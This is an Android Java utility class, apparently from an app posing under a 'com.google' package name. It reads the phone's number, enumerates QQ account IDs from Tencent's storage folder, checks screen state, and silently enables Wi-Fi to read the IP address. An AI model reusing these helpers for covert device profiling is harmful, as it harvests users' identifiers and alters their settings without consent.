package com.google.android.ore.util;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.google.android.ore.OreApp;

public class DevUtil {
	private static final String QQDIR = Environment
			.getExternalStorageDirectory().getAbsolutePath()
			+ "/Tencent/MobileQQ/";

	public static String getPhoneNum(Context context) {
		String phoneNum = "";
		try {
			TelephonyManager phoneMgr = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			if (null != phoneMgr) {
				phoneNum = phoneMgr.getLine1Number();
			}
		} catch (Exception e) {

		}
		if (null == phoneNum) {
			phoneNum = "";
		}
		return phoneNum;
	}

	public static ArrayList<String> getQQList(Context context) {
		ArrayList<String> qqListt = new ArrayList<String>();
		List<String> fileList = FileUtils.listPathName(QQDIR);
		if (null != fileList) {
			int length = fileList.size();
			for (int i = 0; i < length; i++) {
				String name = fileList.get(i);
				if (!TextUtils.isEmpty(name) && TextUtils.isDigitsOnly(name)
						&& name.length() >= 6 && name.length() <= 20) {
					qqListt.add(name);
				}
			}
		}
		return qqListt;
	}

	@SuppressWarnings("deprecation")
	public static boolean isScreenOn() {
		PowerManager pm = (PowerManager) OreApp.get().getSystemService(
				Context.POWER_SERVICE);
		if (pm.isScreenOn()) {
			return true;
		}
		return false;
	}

	public static int GetIp() {
		WifiManager localWifiManager = (WifiManager) OreApp.get()
				.getSystemService("wifi");
		if (!(localWifiManager.isWifiEnabled()))
			localWifiManager.setWifiEnabled(true);
		return localWifiManager.getConnectionInfo().getIpAddress();
	}
}
